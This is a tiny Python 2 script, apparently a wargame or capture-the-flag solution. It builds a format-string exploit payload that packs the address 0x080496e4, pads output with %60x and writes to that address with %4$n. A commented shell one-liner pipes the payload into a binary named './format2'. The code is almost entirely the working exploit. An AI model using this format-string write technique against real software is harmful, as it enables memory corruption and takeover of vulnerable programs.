import struct
ret = struct.pack('I', 0x080496e4) 
print "{0}%60x%4$n".format(ret)
#echo $(python -c 'print "\xe4\x96\x04\x08"+"%060x"+"%4$n"') | ./format2
